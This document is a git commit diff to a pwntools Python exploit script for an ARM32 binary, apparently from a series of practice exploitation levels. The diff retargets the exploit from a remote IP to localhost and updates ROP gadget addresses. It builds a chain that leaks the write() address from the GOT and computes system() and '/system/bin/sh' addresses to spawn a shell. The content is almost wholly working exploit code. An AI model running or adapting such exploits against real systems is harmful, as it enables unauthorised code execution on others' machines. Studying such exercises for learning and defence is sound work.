c87463ca5b8e5386cff216c8c65dd2528e55e68a
answerrrrrrrrr <answerrrrrrrrr@gmail.com>
2016-03-15 16:51:09 +0800

    exp9

--- arm32/exp/level9.py
+++ arm32/exp/level9.py
@@ -1,14 +1,13 @@
 #!/usr/bin/env python
 from pwn import *
 
-#p = process('./level7')
-p = remote('30.10.20.253',10001)
+p = remote('127.0.0.1',10004)
 
 p.recvuntil('\n')
 
-#0x00008a12 : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
+#gadgets in level9
+#0x000088be : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
 gadget1 = 0x000088be + 1
-
 #0x0000863a : pop {r1, r2, r4, r5, r6, pc}
 gadget2 = 0x0000863a + 1
 
@@ -17,7 +16,7 @@ ret_to_vul = 0x000084D8 + 1
 
 #write(r0=1, r1=0x0000AFE8, r2=4)
 r0 = 1
-r1 = 0x0000AFE8
+r1 = 0x0000AFE8  # write() address in GOT
 r2 = 4
 r4 = 0
 r5 = 0
@@ -31,12 +30,12 @@ p.send(payload)
 write_addr = u32(p.recv(4))
 print 'write_addr=' + hex(write_addr)
 
-#.rodata:0003F9B4 aSystemBinSh    DCB "/system/bin/sh",0
-#.text:000253A4                 EXPORT system
-#.text:00020280                 EXPORT write
+#.rodata:0005AAFF   aSystemBinSh    DCB "/system/bin/sh",0
+#.text:00039960                 EXPORT system
+#.text:0003A228                 EXPORT write
 
-r0 = write_addr + (0x0003F9B4 - 0x00020280)
-system_addr = write_addr + (0x000253A4 - 0x00020280) + 1
+r0 = write_addr + (0x0005AAFF - 0x0003A228) #/system/bin/sh addr
+system_addr = write_addr + (0x00039960 - 0x0003A228) + 1
 
 print 'r0=' + hex(r0)
 print 'system_addr=' + hex(system_addr)
